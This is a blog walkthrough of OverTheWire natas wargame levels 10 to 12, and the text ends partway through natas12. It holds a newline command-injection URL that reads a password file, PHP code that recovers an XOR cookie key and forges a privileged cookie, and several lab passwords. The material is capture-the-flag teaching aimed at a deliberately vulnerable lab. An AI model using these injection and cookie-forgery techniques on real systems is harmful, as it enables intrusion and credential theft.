<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Natas Challenges (part 2) - noopz</title><meta name="Description" content="The second in a multi-part walkthrough for the OverTheWire natas levels."><meta property="og:title" content="Natas Challenges (part 2)" />
<meta property="og:description" content="The second in a multi-part walkthrough for the OverTheWire natas levels." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://noopz.github.io/natas_challenges_part2/" />
<meta property="og:image" content="https://noopz.github.io/logo.png"/>
<meta property="article:published_time" content="2020-06-06T18:26:53+00:00" />
<meta property="article:modified_time" content="2020-06-21T11:05:20-07:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>

<meta name="twitter:title" content="Natas Challenges (part 2)"/>
<meta name="twitter:description" content="The second in a multi-part walkthrough for the OverTheWire natas levels."/>
<meta name="application-name" content="noopz">
<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/natas_challenges_part2/" /><link rel="prev" href="https://noopz.github.io/natas_challenges_part1/" /><link rel="next" href="https://noopz.github.io/plex_aac_atfv_fix/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Natas Challenges (part 2)",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/noopz.github.io\/natas_challenges_part2\/"
        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, natas, wargames","wordcount":  2087 ,
        "url": "https:\/\/noopz.github.io\/natas_challenges_part2\/","datePublished": "2020-06-06T18:26:53+00:00","dateModified": "2020-06-21T11:05:20-07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
                "@type": "Person",
                "name": "Zack"
            },"description": "The second in a multi-part walkthrough for the OverTheWire natas levels."
    }
    </script></head>
    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Natas Challenges (part 2)</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-06">2020-06-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2087 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;10 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#natas10">natas10</a></li>
    <li><a href="#natas11">natas11</a></li>
    <li><a href="#natas12">natas12</a></li>
    <li><a href="#natas13">natas13</a></li>
    <li><a href="#natas14">natas14</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>Continuing to work through the OverTheWire natas challenges, this post covers solutions for levels 10 through 14.</p>
<ul>
<li>Part 1 can be found <a href="https://noopz.github.io/natas_challenges_part1/" rel="">here</a></li>
<li>Part 3 can be found <a href="https://noopz.github.io/natas_challenges_part3/" rel="">here</a></li>
<li>Part 4 can be found <a href="https://noopz.github.io/natas_challenges_part4/" rel="">here</a></li>
</ul>
<h2 id="natas10">natas10</h2>
<p>Starting this off by going to: <a href="http://natas10.natas.labs.overthewire.org/">http://natas10.natas.labs.overthewire.org/</a></p>
<p>Login info is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas10
Pass: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
</code></pre></td></tr></table>
</div>
</div><p>Looks like the same challenge as before, except that there is now filtering of <code>;</code> and <code>&amp;s</code> from the input strings. However, since that&rsquo;s all the filtering that is done, it&rsquo;s simple enough to just use a different escape-like character to execute multiple commands, this challenge can be solved with the URL encoding for a <code>\n</code>, aka <code>%A0</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html">http://natas10.natas.labs.overthewire.org/?needle=%0Acat%20/etc/natas_webpass/natas11<span class="err">&amp;</span>submit=Search
</code></pre></td></tr></table>
</div>
</div><p>And the password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
</code></pre></td></tr></table>
</div>
</div><h2 id="natas11">natas11</h2>
<p>Starting this off by going to: <a href="http://natas11.natas.labs.overthewire.org/">http://natas11.natas.labs.overthewire.org/</a></p>
<p>Login info is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas11
Pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
</code></pre></td></tr></table>
</div>
</div><p>The hint after opening the page is:</p>
<blockquote>
<p>Cookies are protected with &ldquo;XOR&rdquo; encryption.</p>
</blockquote>
<p>Followed by a prompt asking for a cookie and a button to view the source.</p>
<p>Time to look at the source:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>

$defaultdata = array( &#34;showpassword&#34;=&gt;&#34;no&#34;, &#34;bgcolor&#34;=&gt;&#34;#ffffff&#34;);

function xor_encrypt($in) {
    $key = &#39;<span class="p">&lt;</span><span class="nt">censored</span><span class="p">&gt;</span>&#39;;
    $text = $in;
    $outText = &#39;&#39;;

    // Iterate through each character
    for($i=0;$i<span class="p">&lt;</span><span class="nt">strlen</span><span class="err">($</span><span class="na">text</span><span class="err">);$</span><span class="na">i</span><span class="err">++)</span> <span class="err">{</span>
      <span class="err">$</span><span class="na">outText</span> <span class="err">.=</span> <span class="err">$</span><span class="na">text</span><span class="err">[$</span><span class="na">i</span><span class="err">]</span> <span class="err">^</span> <span class="err">$</span><span class="na">key</span><span class="err">[$</span><span class="na">i</span> <span class="err">%</span> <span class="na">strlen</span><span class="err">($</span><span class="na">key</span><span class="err">)];</span>
    <span class="err">}</span>

    <span class="na">return</span> <span class="err">$</span><span class="na">outText</span><span class="err">;</span>
<span class="err">}</span>

<span class="na">function</span> <span class="na">loadData</span><span class="err">($</span><span class="na">def</span><span class="err">)</span> <span class="err">{</span>
    <span class="na">global</span> <span class="err">$</span><span class="na">_COOKIE</span><span class="err">;</span>
    <span class="err">$</span><span class="na">mydata </span><span class="o">=</span> <span class="s">$def;</span>
    <span class="na">if</span><span class="err">(</span><span class="na">array_key_exists</span><span class="err">(&#34;</span><span class="na">data</span><span class="err">&#34;,</span> <span class="err">$</span><span class="na">_COOKIE</span><span class="err">))</span> <span class="err">{</span>
    <span class="err">$</span><span class="na">tempdata </span><span class="o">=</span> <span class="s">json_decode(xor_encrypt(base64_decode($_COOKIE[&#34;data&#34;])),</span> <span class="na">true</span><span class="err">);</span>
    <span class="na">if</span><span class="err">(</span><span class="na">is_array</span><span class="err">($</span><span class="na">tempdata</span><span class="err">)</span> <span class="err">&amp;&amp;</span> <span class="na">array_key_exists</span><span class="err">(&#34;</span><span class="na">showpassword</span><span class="err">&#34;,</span> <span class="err">$</span><span class="na">tempdata</span><span class="err">)</span> <span class="err">&amp;&amp;</span> <span class="na">array_key_exists</span><span class="err">(&#34;</span><span class="na">bgcolor</span><span class="err">&#34;,</span> <span class="err">$</span><span class="na">tempdata</span><span class="err">))</span> <span class="err">{</span>
        <span class="na">if</span> <span class="err">(</span><span class="na">preg_match</span><span class="err">(&#39;/^#(?</span><span class="na">:</span><span class="err">[</span><span class="na">a-f</span><span class="err">\</span><span class="na">d</span><span class="err">]{</span><span class="na">6</span><span class="err">})$/</span><span class="na">i</span><span class="err">&#39;,</span> <span class="err">$</span><span class="na">tempdata</span><span class="err">[&#39;</span><span class="na">bgcolor</span><span class="err">&#39;]))</span> <span class="err">{</span>
        <span class="err">$</span><span class="na">mydata</span><span class="err">[&#39;</span><span class="na">showpassword</span><span class="err">&#39;]</span> <span class="err">=</span> <span class="err">$</span><span class="na">tempdata</span><span class="err">[&#39;</span><span class="na">showpassword</span><span class="err">&#39;];</span>
        <span class="err">$</span><span class="na">mydata</span><span class="err">[&#39;</span><span class="na">bgcolor</span><span class="err">&#39;]</span> <span class="err">=</span> <span class="err">$</span><span class="na">tempdata</span><span class="err">[&#39;</span><span class="na">bgcolor</span><span class="err">&#39;];</span>
        <span class="err">}</span>
    <span class="err">}</span>
    <span class="err">}</span>
    <span class="na">return</span> <span class="err">$</span><span class="na">mydata</span><span class="err">;</span>
<span class="err">}</span>

<span class="na">function</span> <span class="na">saveData</span><span class="err">($</span><span class="na">d</span><span class="err">)</span> <span class="err">{</span>
    <span class="na">setcookie</span><span class="err">(&#34;</span><span class="na">data</span><span class="err">&#34;,</span> <span class="na">base64_encode</span><span class="err">(</span><span class="na">xor_encrypt</span><span class="err">(</span><span class="na">json_encode</span><span class="err">($</span><span class="na">d</span><span class="err">))));</span>
<span class="err">}</span>

<span class="err">$</span><span class="na">data </span><span class="o">=</span> <span class="s">loadData($defaultdata);</span>

<span class="na">if</span><span class="err">(</span><span class="na">array_key_exists</span><span class="err">(&#34;</span><span class="na">bgcolor</span><span class="err">&#34;,$</span><span class="na">_REQUEST</span><span class="err">))</span> <span class="err">{</span>
    <span class="na">if</span> <span class="err">(</span><span class="na">preg_match</span><span class="err">(&#39;/^#(?</span><span class="na">:</span><span class="err">[</span><span class="na">a-f</span><span class="err">\</span><span class="na">d</span><span class="err">]{</span><span class="na">6</span><span class="err">})$/</span><span class="na">i</span><span class="err">&#39;,</span> <span class="err">$</span><span class="na">_REQUEST</span><span class="err">[&#39;</span><span class="na">bgcolor</span><span class="err">&#39;]))</span> <span class="err">{</span>
        <span class="err">$</span><span class="na">data</span><span class="err">[&#39;</span><span class="na">bgcolor</span><span class="err">&#39;]</span> <span class="err">=</span> <span class="err">$</span><span class="na">_REQUEST</span><span class="err">[&#39;</span><span class="na">bgcolor</span><span class="err">&#39;];</span>
    <span class="err">}</span>
<span class="err">}</span>
<span class="na">saveData</span><span class="err">($</span><span class="na">data</span><span class="err">);</span>
<span class="err">&lt;/</span><span class="na">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Looking over the source that&rsquo;s available from the server, the process is the following:</p>
<ol>
<li>Pass default data into the &ldquo;loadData&rdquo; function</li>
<li>Load the &ldquo;data&rdquo; from the saved cookie.</li>
<li>Decrypt the cookie to check the values with the following operations:
<ol>
<li>Base64_decode(…)</li>
<li>Xor_encrypt(…)</li>
<li>Json_decode(…)</li>
</ol>
</li>
<li>Once decrypted update the &ldquo;default data&rdquo; that were passed in and return the new values.</li>
<li>Save the &ldquo;loadedData&rdquo; with the following operations:
<ol>
<li>Json_encode(…)</li>
<li>Xor_encrypt(…)</li>
<li>Base64_encode(…)</li>
</ol>
</li>
</ol>
<p>One of the more interesting things to note is the xor_encrypt function used for both the save and load data (encrypt and decrypt). An interesting behavior behind XOR:</p>
<blockquote>
<p>A = X ^ Y == A ^ X = Y</p>
</blockquote>
<p>This behavior is interesting because despite not knowing the key that was used by the server, we do know what the expected value of the cookie is. Which a little bit of coding, we can exploit the behavior of XOR to get the key used by the server back. Once we have the key, we can update the value of <code>showpassword</code> to <code>yes</code>, re-encrypt the data, reload the page, and have the password show up, unlocking the next level.</p>
<p>Using the input of <code>#ffffff</code> for the saved cookie produces the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
</code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s worth noting that <code>%3D</code> is the URL encoding for <code>=</code>, so really the cookie is,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="nv">ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw</span><span class="o">=</span>
</code></pre></td></tr></table>
</div>
</div><p>Using the original &ldquo;xor_encrypt&rdquo; function from above and modifying it slightly to take in a key:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">function xor_encrypt($in, $key) {
    $key = $key;
    $text = $in;
    $outText = &#39;&#39;;
        echo &#34;<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>&#34;;
    // Iterate through each character
    for ($i=0; $i<span class="p">&lt;</span><span class="nt">strlen</span><span class="err">($</span><span class="na">text</span><span class="err">);</span> <span class="err">$</span><span class="na">i</span><span class="err">++)</span> <span class="err">{</span>
        <span class="err">$</span><span class="na">outText</span> <span class="err">.=</span> <span class="err">$</span><span class="na">text</span><span class="err">[$</span><span class="na">i</span><span class="err">]</span> <span class="err">^</span> <span class="err">$</span><span class="na">key</span><span class="err">[$</span><span class="na">i</span> <span class="err">%</span> <span class="na">strlen</span><span class="err">($</span><span class="na">key</span><span class="err">)];</span>
    <span class="err">}</span>
    <span class="na">return</span> <span class="err">$</span><span class="na">outText</span><span class="err">;</span>
<span class="err">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Create a function that takes in the original or default data, as well as the <code>base64_decoded</code> cookie. The purpose of this function is to use the &ldquo;known&rdquo; data and our &ldquo;encrypted&rdquo; data in order to determine the key.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">function xor_decode_key($in, $orig) {
    $text = $in;
    $plainText = $orig;

    for ($i = 0; $i <span class="p">&lt;</span> <span class="nt">strlen</span><span class="err">($</span><span class="na">text</span><span class="err">);</span> <span class="err">$</span><span class="na">i</span><span class="err">++)</span> <span class="err">{</span>
    <span class="err">$</span><span class="na">d</span> <span class="err">.=</span> <span class="err">($</span><span class="na">plainText</span><span class="err">[$</span><span class="na">i</span><span class="err">])</span> <span class="err">^</span> <span class="err">$</span><span class="na">text</span><span class="err">[$</span><span class="na">i</span><span class="err">];</span>
    <span class="err">}</span>
    <span class="na">return</span> <span class="err">$</span><span class="na">d</span><span class="err">;</span>
<span class="err">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Create a function that takes in the <code>base64_decoded</code> text, and our discovered key to decrypt the data (verifies that everything works as expected):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">function xor_decrypt($in, $_key) {
    $text = $in;
    $key = $_key;

    for ($i = 0; $i <span class="p">&lt;</span> <span class="nt">strlen</span><span class="err">($</span><span class="na">text</span><span class="err">);</span> <span class="err">$</span><span class="na">i</span><span class="err">++)</span> <span class="err">{</span>
        <span class="err">$</span><span class="na">d</span> <span class="err">.=</span> <span class="err">$</span><span class="na">text</span><span class="err">[$</span><span class="na">i</span><span class="err">]</span> <span class="err">^</span> <span class="err">$</span><span class="na">key</span><span class="err">[$</span><span class="na">i</span><span class="err">];</span>
    <span class="err">}</span>
    <span class="na">return</span> <span class="err">$</span><span class="na">d</span><span class="err">;</span>
<span class="err">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Put together with the known data (taken directly from the original source):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">$defaultdata = array(&#34;showpassword&#34; =&gt; &#34;no&#34;,
        &#34;bgcolor&#34; =&gt; &#34;#ffffff&#34;);
</code></pre></td></tr></table>
</div>
</div><p>Grabbing the cookie from the browser:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">$k0 = &#34;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&#34;;
</code></pre></td></tr></table>
</div>
</div><p>Then call the function to determine the key used by passing in the <code>base64_decoded</code> cookie:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">$key0 = xor_decode_key(base64_decode($k0), json_encode($df));
echo $key0;
</code></pre></td></tr></table>
</div>
</div><p>Verify that we have the correct key by decoding the cookie entirely:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">$dcka = xor_decrypt(base64_decode($k0), $key0);
echo &#34;<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>&#34;.$dcka;
</code></pre></td></tr></table>
</div>
</div><p>Update the <code>defaultdata</code>'s showpassword to yes and then encrypt with the key just found:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">$newcookie = base64_encode(xor_encrypt(json_encode($defaultdata), $dcka));
echo &#34;<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>&#34;.$newcookie;
</code></pre></td></tr></table>
</div>
</div><p>All that&rsquo;s left is to take the cookie and put it into the browser and refresh.</p>
<p>Which gives us the password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">The password <span class="k">for</span> natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
</code></pre></td></tr></table>
</div>
</div><h2 id="natas12">natas12</h2>
<p>Starting this off by going to: <a href="http://natas12.natas.labs.overthewire.org/">http://natas12.natas.labs.overthewire.org/</a></p>
<p>Login info is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas12
Pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
</code></pre></td></tr></table>
</div>
</div><p>This challenge has a simple JPEG upload form, with a max size of <code>1KB</code>, and an option to view the source.</p>
<p>Clicking the view the source:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="cp">&lt;?
</span><span class="cp">
</span><span class="cp">function genRandomString() {
</span><span class="cp">    $length = 10;
</span><span class="cp">    $characters = &#34;0123456789abcdefghijklmnopqrstuvwxyz&#34;;
</span><span class="cp">    $string = &#34;&#34;;
</span><span class="cp">    for ($p = 0; $p &lt; $length; $p++) {
</span><span class="cp">        $string .= $characters[mt_rand(0, strlen($characters)-1)];
</span><span class="cp">    }
</span><span class="cp">    return $string;
</span><span class="cp">}
</span><span class="cp">
</span><span class="cp">function makeRandomPath($dir, $ext) {
</span><span class="cp">    do {
</span><span class="cp">    $path = $dir.&#34;/&#34;.genRandomString().&#34;.&#34;.$ext;
</span><span class="cp">    } while(file_exists($path));
</span><span class="cp">    return $path;
</span><span class="cp">}
</span><span class="cp">
</span><span class="cp">if(array_key_exists(&#34;filename&#34;, $_POST)) {
</span><span class="cp">    $target_path = makeRandomPathFromFilename(&#34;upload&#34;, $_POST[&#34;filename&#34;]);
</span><span class="cp">        if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {
</span><span class="cp">        echo &#34;File is too big&#34;;
</span><span class="cp">    } else {
</span><span class="cp">        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {
</span><span class="cp">            echo &#34;The file &lt;a href=\&#34;$target_path\&#34;&gt;$target_path&lt;/a&gt; has been uploaded&#34;;
</span><span class="cp">        } else{
</span><span class="cp">            echo &#34;There was an error uploading the file, please try again!&#34;;
</span><span class="cp">        }
</span><span class="cp">    }
</span><span class="cp">} else {
</span><span class="cp">?&gt;</span>

<span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;index.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;MAX_FILE_SIZE&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1000&#34;</span> <span class="p">/&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;filename&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;? print genRandomString(); ?&gt;.jpg&#34;</span> <span class="p">/&gt;</span>
Choose a JPEG to upload (max 1KB):<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
